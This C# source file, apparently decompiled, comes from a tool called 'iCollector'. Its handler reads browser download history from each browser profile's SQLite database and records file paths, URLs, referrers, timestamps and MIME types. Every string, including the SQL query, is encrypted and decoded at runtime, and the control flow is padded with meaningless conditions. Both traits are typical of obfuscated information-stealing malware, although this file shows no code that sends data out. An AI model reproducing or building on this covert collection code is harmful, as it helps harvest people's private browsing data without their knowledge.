using System;
using System.Collections.Generic;
using iCollector.Job.Model;
using iCollector.Util;
using Microsoft.Data.Sqlite;

namespace iCollector.Job.Handler;

internal class ReadDownloadHistoryHandler
{
	private static string CLAZZ_NAME_SE = "hqedydmAqtFlzr+ZZLSoBA==.0GjbIpI3z/vC17yBxtArJtLxlWTiGv3GJhRGd69m5Bg2koSG0MvgorJEDoPChabc";

	private static string CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);

	private static string LOG_1_SE = "mBi0mQwNjWeWPkALeHiURQ==.9TFg/9NqGIwuLWrrZeDSmbID+LB6EP5GgCMJtibH7mUV6NG4jSuqwkiN6xY1lQuX58PuZ41wGCmbuID8TCGzmQ==";

	private static string LOG_1 = SecurityUtils.ReadStructEncrypted(LOG_1_SE);

	private static string LOG_2_SE = "71IVWzTu3xacAW5/wwg19A==.XHBV1ofBuwWxafYssP6u3Dif2X6TD1eRji2f8kOSRmC6f3ckhHVPV36QAz9fZanF";

	private static string LOG_2 = SecurityUtils.ReadStructEncrypted(LOG_2_SE);

	private static string DATE_FM_SE = "eorpIy/IdIgbqs9w9uXx2g==.kE9l6qAcigJ84quvQJb9Wrlvrw+PL4xz4uNVR80A1ZfEuJVvKt9XCn0k9oFsP1rF";

	private static string DATE_FM = SecurityUtils.ReadStructEncrypted(DATE_FM_SE);

	private static string LOCATION_SE = "cJKa0FMjT3lAsf00qkfz2g==.6rATuVrwOgY3WRVWQnRqgT5Zs6nxaMvfdPc58+sO7mM=";

	private static string LOCATION = SecurityUtils.ReadStructEncrypted(LOCATION_SE);

	private static string TIME_SE = "mZb8ecm9QwMUsxjEjSZU1g==.ufNqFoc2aXRlPerzVWmn7QRpyWJchLSaTtF76pLi5NM=";

	private static string TIME = SecurityUtils.ReadStructEncrypted(TIME_SE);

	private static string REF_SE = "b0G+lbmSAX8dEZ702ghxOg==.jpVIbPKiy5TUP6ivNac0sGDaDjm0cfUgbE+2eSjYx4A=";

	private static string REF = SecurityUtils.ReadStructEncrypted(REF_SE);

	private static string URL_SE = "HMWhv0HX/W+2PlYPxy5T8A==.RQedqCzgfqUV4EbGSAwwngsXDElH0tGHftuk1FTubyw=";

	private static string URL = SecurityUtils.ReadStructEncrypted(URL_SE);

	private static string REFT_SE = "f95RX0KYcQEa7RKqv5tn2w==.5E4CR/6RYp0XbA9jkAXoRRuRE1trm46GFa/kGcMF6Nk=";

	private static string REFT = SecurityUtils.ReadStructEncrypted(REFT_SE);

	private static string MIME_SE = "5ea0DfTArs1tItIz1lRHCA==.487Lu/dBvTMuZfO6Lu04Fdu64v584cWJwCzbUCgqGUY=";

	private static string MIME = SecurityUtils.ReadStructEncrypted(MIME_SE);

	private static readonly string Q1_SE = "Rc7wk4aiq2BtfudJVQx9pA==.E71rT6QKhYl3M6i742/y9drMMdGhDFID6Rs+GAKGhiRnXyd+JCW3EDQM69p923kKiaKsP560tIHEMf9wY4RqWrdV5sp9lY0eCv0/8KCPgHNMNRvid2S4l5gdKsUAJ45KybgXXLwx4Yrxr1xtmSyMPkZlKfFXwvc9muurJ/SjW+/Tpsy7QM3G0ZKyY3KGGi9K";

	private static readonly string Q1 = SecurityUtils.ReadStructEncrypted(Q1_SE);

	private Logger log = Logger.Instance();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	public void Enrich(CKModel model)
	{
		if (model.Profiles == null)
		{
			return;
		}
		int num = model.Profiles.Count;
		List<CKProfile>.Enumerator enumerator2 = default(List<CKProfile>.Enumerator);
		CKProfile cKProfile = default(CKProfile);
		while (num != 0)
		{
			while (true)
			{
				List<CKProfile>.Enumerator enumerator = model.Profiles.GetEnumerator();
				if (8u != 0 && 0 == 0)
				{
					enumerator2 = enumerator;
				}
				try
				{
					while (true)
					{
						IL_00d1:
						int num2 = (enumerator2.MoveNext() ? 1 : 0);
						if (0 == 0)
						{
							while (num2 != 0)
							{
								while (true)
								{
									CKProfile current = enumerator2.Current;
									if (0 == 0 && 0 == 0)
									{
										cKProfile = current;
									}
									Logger logger = log;
									LogContext logContext = ctx;
									string message = LOG_1 + cKProfile.Path;
									if (2u != 0 && 7u != 0)
									{
										logger.Info(logContext, message);
									}
									CKProfile cKProfile2 = cKProfile;
									List<string> downloadValues = new List<string>();
									if (0 == 0 && 3u != 0)
									{
										cKProfile2.DownloadValues = downloadValues;
									}
									if (string.IsNullOrEmpty(cKProfile.HisPath))
									{
										break;
									}
									num2 = 0;
									if (num2 != 0)
									{
										goto IL_00db;
									}
									if (num2 != 0)
									{
										continue;
									}
									goto IL_0081;
								}
								goto IL_00d1;
								IL_00db:;
							}
							break;
						}
						goto IL_009e;
						IL_009e:
						Logger logger2 = log;
						LogContext logContext2 = ctx;
						string lOG_ = LOG_2;
						int count = cKProfile.DownloadValues.Count;
						int num3;
						if (uint.MaxValue != 0 && 5u != 0)
						{
							num3 = count;
						}
						string message2 = lOG_ + num3;
						if (0 == 0)
						{
							if (0 == 0)
							{
								logger2.Info(logContext2, message2);
							}
							if (false)
							{
							}
						}
						continue;
						IL_0081:
						num2 = (DataSourceHelper.ExecuteQuery(cKProfile.HisPath, Q1, CreateConsumer(model, cKProfile), 500) ? 1 : 0);
						goto IL_009e;
					}
				}
				finally
				{
					((IDisposable)enumerator2).Dispose();
				}
				num = 3;
				if (num == 0)
				{
					break;
				}
				if (num != 0)
				{
					return;
				}
			}
		}
	}

	private Consumer<SqliteDataReader>.Accept CreateConsumer(CKModel model, CKProfile profile)
	{
		CKProfile profile2 = profile;
		return delegate(SqliteDataReader reader)
		{
			string @string = reader.GetString(0);
			string text;
			if (7u != 0 && 4u != 0)
			{
				text = @string;
			}
			long @int = reader.GetInt64(1);
			long microseconds = default(long);
			if (0 == 0 && 0 == 0)
			{
				microseconds = @int;
			}
			string text3 = default(string);
			string text4 = default(string);
			string item;
			do
			{
				string string2 = reader.GetString(2);
				string text2;
				if (5u != 0)
				{
					text2 = string2;
				}
				string string3 = reader.GetString(3);
				if (0 == 0)
				{
					text3 = string3;
				}
				string string4 = reader.GetString(4);
				if (0 == 0)
				{
					text4 = string4;
				}
				string string5 = reader.GetString(5);
				string text5;
				if (uint.MaxValue != 0)
				{
					text5 = string5;
				}
				DateTime dateTime = DateAppUtils.AdMcs(DateAppUtils.NewDateTime(1601, 1, 1), microseconds);
				DateTime dateTime2;
				if (3u != 0)
				{
					dateTime2 = dateTime;
				}
				string text6 = dateTime2.ToString(DATE_FM);
				string text7;
				if (7u != 0)
				{
					text7 = text6;
				}
				string text8 = LOCATION + text + TIME + text7 + REF + text2 + URL + text3 + REFT + text4 + MIME + text5;
				if (3u != 0)
				{
					item = text8;
				}
			}
			while (4 == 0);
			List<string> downloadValues = profile2.DownloadValues;
			if (0 == 0)
			{
				downloadValues.Add(item);
			}
		};
	}
}
